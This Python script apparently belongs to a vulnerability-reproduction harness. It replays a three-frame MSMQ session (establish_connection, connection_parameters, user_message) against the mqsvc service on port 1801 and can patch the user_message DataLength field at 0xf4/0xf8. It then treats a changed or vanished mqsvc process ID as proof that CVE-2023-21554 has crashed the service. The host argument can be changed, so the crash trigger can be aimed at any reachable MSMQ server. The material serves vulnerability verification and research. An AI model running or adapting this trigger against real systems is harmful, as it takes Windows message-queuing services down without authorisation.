#!/usr/bin/env python3
"""Ground-truth oracle: send the MSMQ 3-frame sequence to the LOCAL mqsvc and confirm it crashes.
The crash needs the full session: establish_connection -> connection_parameters -> user_message
(a single packet only completes the handshake). Frames are in demo/kb/msmq/.

  python send_and_verify.py                    # public frames (confirms the target is vulnerable)
  python send_and_verify.py --datalength 0x08000000   # patch user_message's DataLength (@0xf4/0xf8)

Windows, run after install_and_swap.ps1. Detects the crash by the mqsvc PID changing/vanishing.
"""
import socket, subprocess, time, struct, os, argparse, sys

HERE = os.path.dirname(os.path.abspath(__file__))
KB = os.path.join(HERE, "kb", "msmq")

def mqsvc_pid():
    try:
        out = subprocess.run(["tasklist", "/fi", "imagename eq mqsvc.exe", "/fo", "csv", "/nh"],
                             capture_output=True, text=True).stdout
        for line in out.splitlines():
            if "mqsvc.exe" in line.lower():
                return line.split(",")[1].strip().strip('"')
    except Exception:
        pass
    return None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1"); ap.add_argument("--port", type=int, default=1801)
    ap.add_argument("--datalength", default=None, help="override user_message DataLength (hex), else use as-is")
    a = ap.parse_args()

    ec = open(os.path.join(KB, "establish_connection.bin"), "rb").read()
    cp = open(os.path.join(KB, "connection_parameters.bin"), "rb").read()
    um = bytearray(open(os.path.join(KB, "user_message.bin"), "rb").read())
    if a.datalength is not None:
        v = int(a.datalength, 16) & 0xffffffff
        for off in (0xf4, 0xf8):                         # SRMP DataLength field in this message
            struct.pack_into("<I", um, off, v)
        print(f"[send] patched DataLength @0xf4/0xf8 = {a.datalength}")

    p0 = mqsvc_pid()
    print(f"[send] mqsvc pid before = {p0}")
    s = socket.socket(); s.settimeout(8); s.connect((a.host, a.port))
    for name, frame in (("establish", ec), ("params", cp), ("message", bytes(um))):
        s.send(frame); time.sleep(0.3)
        try:
            s.setblocking(False); s.recv(1024)
        except Exception:
            pass
        s.setblocking(True)
    try: s.close()
    except Exception: pass
    time.sleep(4)
    p1 = mqsvc_pid()
    print(f"[send] mqsvc pid after  = {p1}")
    if p1 is None or p1 != p0:
        print("*** REPRODUCED: mqsvc crashed (PID changed/gone), CVE-2023-21554 ***"); sys.exit(0)
    print("mqsvc survived. Check the vulnerable DLL is loaded (install_and_swap.ps1) and try a crashing DataLength")
    sys.exit(1)

if __name__ == "__main__":
    main()
